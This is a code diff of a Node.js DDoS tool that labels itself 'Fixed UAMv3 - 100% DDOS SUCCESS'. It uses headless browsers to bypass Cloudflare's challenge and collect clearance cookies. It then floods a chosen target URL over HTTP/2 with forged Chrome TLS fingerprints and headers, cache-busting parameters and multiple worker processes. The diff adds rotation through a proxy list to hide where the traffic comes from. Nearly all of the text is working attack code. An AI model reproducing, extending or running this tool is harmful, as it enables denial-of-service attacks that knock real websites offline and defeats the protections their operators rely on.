@@ -6,9 +6,8 @@ const url = require("url");
 const crypto = require("crypto");
 const fs = require("fs");
 const os = require("os");
-const HPACK = require('hpack'); // Giữ nhưng không dùng thủ công nữa
+const HPACK = require('hpack');
 
-// ** ADVANCED TLS FINGERPRINTING & HEADER GENERATION - Tinh chỉnh shuffle nhẹ hơn **
 function getAdvancedChromeTlsOptions(parsedTarget) {
     const chromeProfiles = [
         {
@@ -49,7 +48,7 @@ function getAdvancedChromeTlsOptions(parsedTarget) {
     ];
     
     const shuffledCiphers = [...profile.ciphers];
-    if (Math.random() < 0.05) { // Giảm xác suất shuffle để giống browser ổn định hơn
+    if (Math.random() < 0.05) {
         const i = shuffledCiphers.length - 1, j = Math.max(0, i - 1);
         [shuffledCiphers[i], shuffledCiphers[j]] = [shuffledCiphers[j], shuffledCiphers[i]];
     }
@@ -126,7 +125,6 @@ function generateAdvancedBrowserHeaders(userAgentFromBypass) {
 }
 
 function getBrowserLikeHeaderOrder() {
-    // Order giống Chrome, nhưng randomize nhẹ vị trí sec-ch-* phụ để đa dạng
     const baseOrder = [
         ':method',
         ':authority',
@@ -154,11 +152,10 @@ function getBrowserLikeHeaderOrder() {
         'referer',
         'cookie'
     ];
-    // Randomize nhẹ phần giữa (sec-ch-*)
     const secChStart = baseOrder.indexOf('sec-ch-ua');
     const secChEnd = baseOrder.indexOf('upgrade-insecure-requests');
     const secChSection = baseOrder.slice(secChStart, secChEnd);
-    if (Math.random() < 0.2) { // 20% chance shuffle nhẹ
+    if (Math.random() < 0.2) {
         for (let i = secChSection.length - 1; i > 0; i--) {
             const j = Math.floor(Math.random() * (i + 1));
             [secChSection[i], secChSection[j]] = [secChSection[j], secChSection[i]];
@@ -194,40 +191,54 @@ function randstr(length) {
 function generateCacheBuster() {
     const params = ['_', 'cb', 't', 'cache', 'v'];
     const param = params[Math.floor(Math.random() * params.length)];
-    const value = Date.now() + Math.floor(Math.random() * 10000); // Tăng rand để đa dạng
+    const value = Date.now() + Math.floor(Math.random() * 10000);
     return `${param}=${value}`;
 }
 
-// ** BYPASS CLOUDFLARE - Tăng batchSize nếu cần nhiều sessions **
-async function bypassCloudflareOnce(attemptNum = 1) {
+function loadProxies(proxyFile) {
+    if (!proxyFile || !fs.existsSync(proxyFile)) return [];
+    const proxyList = fs.readFileSync(proxyFile, 'utf-8').split('\n').map(line => line.trim()).filter(line => line);
+    return proxyList.map(proxy => {
+        const [host, port] = proxy.split(':');
+        return { host, port: parseInt(port) };
+    });
+}
+
+async function bypassCloudflareOnce(attemptNum = 1, proxy = null) {
     let response = null;
     let browser = null;
     let page = null;
     try {
-        console.log(`\x1b[33m🔄 Starting bypass attempt ${attemptNum}...\x1b[0m`);
-        response = await connect({
+        console.log(`[+] Starting Bypass Attempt ${attemptNum}...`);
+        const connectOptions = {
             headless: 'auto',
             args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-gpu', '--window-size=1920,1080'],
             turnstile: true,
-        });
+        };
+        if (proxy) {
+            connectOptions.args.push(`--proxy-server=${proxy.host}:${proxy.port}`);
+        }
+        response = await connect(connectOptions);
         browser = response.browser;
         page = response.page;
         await page.goto(args.target, { waitUntil: 'domcontentloaded', timeout: 45000 });
-        console.log("\x1b[33m⏳ Checking for Cloudflare challenge...\x1b[0m");
+        console.log(`[+] Checking For Cloudflare Challenge...`);
         
         let challengeCompleted = false;
         let waitCount = 0;
-        while (!challengeCompleted) { // Chờ vô hạn đến khi có cookie, thay vì giới hạn 40 lần
+        while (!challengeCompleted) {
             await new Promise(r => setTimeout(r, 500));
             waitCount++;
             const cookies = await page.cookies();
             if (cookies.some(c => c.name === "cf_clearance")) {
                 challengeCompleted = true;
-                console.log(`\x1b[32m✅ cf_clearance cookie found after ${waitCount * 0.5} seconds.\x1b[0m`);
+                console.log(`[+] Solve Success:`);
+                console.log(`\t- Cookie: ${cookies.map(c => `${c.name}=${c.value}`).join("; ")}`);
+                if (proxy) console.log(`\t- IP: ${proxy.host}:${proxy.port}`);
                 break;
             }
-            if (waitCount % 20 === 0) { // Log progress mỗi 10 giây để theo dõi
-                console.log(`\x1b[33m⏳ Still waiting for cf_clearance cookie... (${waitCount * 0.5} seconds elapsed)\x1b[0m`);
+            if (waitCount % 20 === 0) {
+                console.log(`[+] Still Waiting For Cf_clearance Cookie... (${waitCount * 0.5} Seconds Elapsed)`);
             }
         }
 
@@ -239,38 +250,38 @@ async function bypassCloudflareOnce(attemptNum = 1) {
              throw new Error("cf_clearance cookie not found after wait.");
         }
 
-        console.log(`\x1b[32m✅ Bypass attempt ${attemptNum} successful.\x1b[0m`);
-        return { cookies, userAgent, success: true, attemptNum };
+        console.log(`[+] Bypass Attempt ${attemptNum} Successful.`);
+        return { cookies, userAgent, success: true, attemptNum, proxy };
     } catch (error) {
-        console.log(`\x1b[31m❌ Bypass attempt ${attemptNum} failed: ${error.message}\x1b[0m`);
+        console.log(`[+] Bypass Attempt ${attemptNum} Failed: ${error.message}`);
         try { if (browser) await browser.close(); } catch (e) {}
-        return { cookies: [], userAgent: "", success: false, attemptNum };
+        return { cookies: [], userAgent: "", success: false, attemptNum, proxy };
     }
 }
 
-async function bypassCloudflareParallel(totalCount) {
-    console.log("\x1b[35m╔════════════════════════════════════════════╗\x1b[0m");
-    console.log("\x1b[35m║     CLOUDFLARE BYPASS - PARALLEL MODE      ║\x1b[0m");
-    console.log("\x1b[35m╚════════════════════════════════════════════╝\x1b[0m");
-    
+async function bypassCloudflareParallel(totalCount, proxyList) {
+    console.log("[+] Cloudflare Bypass - Parallel Mode");
     const results = [];
     let attemptCount = 0;
-    const batchSize = 3; // Tăng nhẹ để có nhiều sessions rotate
+    const batchSize = 3;
     
     while (results.length < totalCount) {
         const remaining = totalCount - results.length;
         const currentBatchSize = Math.min(batchSize, remaining);
-        console.log(`\n\x1b[33m🔄 Starting parallel batch (${currentBatchSize} sessions)...\x1b[0m`);
+        console.log(`[+] Starting Parallel Batch (${currentBatchSize} Sessions)...`);
         
-        const batchPromises = Array.from({ length: currentBatchSize }, () => bypassCloudflareOnce(++attemptCount));
+        const batchPromises = Array.from({ length: currentBatchSize }, () => {
+            const proxy = proxyList.length > 0 ? proxyList[Math.floor(Math.random() * proxyList.length)] : null;
+            return bypassCloudflareOnce(++attemptCount, proxy);
+        });
         const batchResults = await Promise.all(batchPromises);
         
         for (const result of batchResults) {
             if (result.success && result.cookies.length > 0) {
                 results.push(result);
-                console.log(`\x1b[32m✅ Session ${result.attemptNum} obtained! (Total: ${results.length}/${totalCount})\x1b[0m`);
+                console.log(`[+] Session ${result.attemptNum} Obtained! (Total: ${results.length}/${totalCount})`);
             } else {
-                console.log(`\x1b[31m❌ Session ${result.attemptNum} failed\x1b[0m`);
+                console.log(`[+] Session ${result.attemptNum} Failed`);
             }
         }
         if (results.length < totalCount) await new Promise(r => setTimeout(r, 2000));
@@ -278,7 +289,6 @@ async function bypassCloudflareParallel(totalCount) {
     return results.length > 0 ? results : [{ cookies: [], userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36" }];
 }
 
-// ** UPDATED FLOODER - Thêm delay random giữa requests **
 async function runFlooder() {
     const bypassInfo = global.bypassData[Math.floor(Math.random() * global.bypassData.length)];
     if (!bypassInfo || !bypassInfo.userAgent) return;
@@ -287,14 +297,18 @@ async function runFlooder() {
     const advancedHeaders = generateAdvancedBrowserHeaders(bypassInfo.userAgent);
     const tlsOptions = getAdvancedChromeTlsOptions(parsedTarget);
 
-    const client = http2.connect(args.target, {
+    const clientOptions = {
         createConnection: (authority, option) => {
-            return tls.connect({
+            const tlsConfig = {
                 ...tlsOptions,
                 port: 443,
                 host: parsedTarget.host,
                 ALPNProtocols: ['h2'],
-            });
+            };
+            if (bypassInfo.proxy) {
+                tlsConfig.proxy = `http://${bypassInfo.proxy.host}:${bypassInfo.proxy.port}`;
+            }
+            return tls.connect(tlsConfig);
         },
         settings: {
             headerTableSize: 262144,
@@ -302,7 +316,9 @@ async function runFlooder() {
             initialWindowSize: 6291456,
             maxHeaderListSize: 4096
         }
-    });
+    };
+
+    const client = http2.connect(args.target, clientOptions);
 
     const connectionId = Math.random().toString(36).substring(2);
     global.activeConnections.add(connectionId);
@@ -315,7 +331,6 @@ async function runFlooder() {
             }
             try {
                 for (let i = 0; i < args.Rate; i++) {
-                    // Delay random 50-200ms giữa requests để giống browser
                     await new Promise(r => setTimeout(r, 50 + Math.floor(Math.random() * 150)));
 
                     const querySeparator = parsedTarget.path.includes('?') ? '&' : '?';
@@ -353,15 +368,13 @@ async function runFlooder() {
 
                     req.end();
                 }
-            } catch (e) {
-                // Ignore write errors if destroyed
-            }
+            } catch (e) {}
         }, 1000);
 
         setTimeout(() => {
             clearInterval(attackInterval);
             client.close();
-        }, 30000); // Keep alive 30s
+        }, 30000);
     });
 
     const cleanup = () => {
@@ -372,21 +385,15 @@ async function runFlooder() {
     client.on('close', cleanup);
 }
 
-// ** CLUSTER & STATS - Giữ nguyên, thêm log chi tiết nếu cần **
 function displayStats() {
     const elapsed = Math.floor((Date.now() - global.startTime) / 1000);
     const remaining = Math.max(0, args.time - elapsed);
     
     console.clear();
-    console.log("\x1b[35m╔════════════════════════════════════════════╗\x1b[0m");
-    console.log("\x1b[35m║        FIXED UAMv3 - 100% DDOS SUCCESS     ║\x1b[0m");
-    console.log("\x1b[35m╚════════════════════════════════════════════╝\x1b[0m");
-    console.log(`\x1b[36m🎯 Target:\x1b[0m ${args.target}`);
-    console.log(`\x1b[36m⏱  Time:\x1b[0m ${elapsed}s / ${args.time}s`);
-    console.log(`\x1b[36m⏳ Remaining:\x1b[0m ${remaining}s`);
-    console.log(`\x1b[36m🔧 Config:\x1b[0m Rate: ${args.Rate}/s | Threads: ${args.threads}`);
-    console.log(`\x1b[36m🍪 Sessions:\x1b[0m ${global.bypassData ? global.bypassData.length : 0} / ${args.cookieCount} requested`);
-
+    console.log("[+] Fixed Uamv3 - 100% Ddos Success");
+    console.log(`[+] Target: ${args.target}`);
+    console.log(`[+] Total Rqs: ${global.totalRequests || 0} | Rps: ${elapsed > 0 ? (global.totalRequests / elapsed).toFixed(2) : 0}`);
+    
     let totalStatuses = {};
     let totalRequests = 0;
     for (let w in global.workers) {
@@ -401,25 +408,26 @@ function displayStats() {
             totalRequests += msg.totalRequests || 0;
         }
     }
-    console.log(`\x1b[33m📊 Statistics:\x1b[0m`);
-    console.log(`   \x1b[36m📈 Total Requests:\x1b[0m ${totalRequests}`);
-    console.log(`   \x1b[33m⚡ Rate:\x1b[0m ${elapsed > 0 ? (totalRequests / elapsed).toFixed(2) : 0} req/s`);
-    console.log(`   \x1b[32m🔧 Status Codes:\x1b[0m`, totalStatuses);
+    console.log(`[+] Status Code:`, totalStatuses);
+    console.log("[+] Configuration:");
+    console.log(`\t- Rate: ${args.Rate}`);
+    console.log(`\t- Threads: ${args.threads}`);
+    console.log(`\t- Cookie Count: ${args.cookieCount}`);
+    if (args.proxyFile) console.log(`\t- Proxy File: ${args.proxyFile}`);
 
     const progress = Math.floor((elapsed / args.time) * 30);
     const progressBar = "█".repeat(progress) + "░".repeat(30 - progress);
-    console.log(`\n\x1b[36mProgress: [\x1b[32m${progressBar}\x1b[36m]\x1b[0m`);
+    console.log(`[+] Progress: [${progressBar}]`);
 }
 
-// Initialize global
 global.activeConnections = new Set();
 global.workers = {};
 global.startTime = Date.now();
 global.bypassData = [];
 
 if (process.argv.length < 7) {
-    console.log("\x1b[31m❌ Usage: node fixed.js <target> <time> <rate> <threads> <cookieCount>\x1b[0m");
-    console.log("\x1b[33mExample: node fixed.js https://example.com 60 100 8 5\x1b[0m");
+    console.log("[+] Usage: node fixed.js <target> <time> <rate> <threads> <cookieCount> [proxyFile]");
+    console.log("[+] Example: node fixed.js https://example.com 60 100 8 5 proxy.txt");
     process.exit(1);
 }
 
@@ -428,23 +436,23 @@ const args = {
     time: parseInt(process.argv[3]),
     Rate: parseInt(process.argv[4]),
     threads: parseInt(process.argv[5]),
-    cookieCount: parseInt(process.argv[6]) || 4 // Tăng default để rotate tốt hơn
+    cookieCount: parseInt(process.argv[6]) || 4,
+    proxyFile: process.argv[7]
 };
 
 const parsedTarget = url.parse(args.target);
+const proxyList = loadProxies(args.proxyFile);
 
 if (cluster.isMaster) {
     console.clear();
-    console.log("\x1b[35m╔════════════════════════════════════════════╗\x1b[0m");
-    console.log("\x1b[35m║        FIXED UAMv3 - 100% DDOS SUCCESS     ║\x1b[0m");
-    console.log("\x1b[35m╚════════════════════════════════════════════╝\x1b[0m");
+    console.log("[+] Fixed Uamv3 - 100% Ddos Success");
     
     (async () => {
-        const bypassResults = await bypassCloudflareParallel(args.cookieCount);
+        const bypassResults = await bypassCloudflareParallel(args.cookieCount, proxyList);
         global.bypassData = bypassResults;
         
-        console.log(`\n\x1b[32m✅ Successfully obtained ${bypassResults.length} session(s)!\x1b[0m`);
-        console.log("\x1b[32m🚀 Starting attack...\x1b[0m\n");
+        console.log(`[+] Successfully Obtained ${bypassResults.length} Session(s)!`);
+        console.log("[+] Starting Attack...");
         
         global.startTime = Date.now();
         
@@ -470,12 +478,12 @@ if (cluster.isMaster) {
         
         setTimeout(() => {
             clearInterval(statsInterval);
-            console.log("\n\x1b[32m✅ Attack completed!\x1b[0m");
+            console.log("[+] Attack Completed!");
             process.exit(0);
         }, args.time * 1000);
     })();
     
-} else { // Worker
+} else {
     let statusesQ = [];
     global.totalRequests = 0;
     global.statuses = {};
@@ -483,7 +491,7 @@ if (cluster.isMaster) {
     process.on('message', (msg) => {
         if (msg.type === 'bypassData') {
             global.bypassData = msg.data;
-            setInterval(() => runFlooder(), 500); // Async để delay ok
+            setInterval(() => runFlooder(), 500);
             
             setInterval(() => {
                 if (Object.keys(global.statuses).length > 0) {
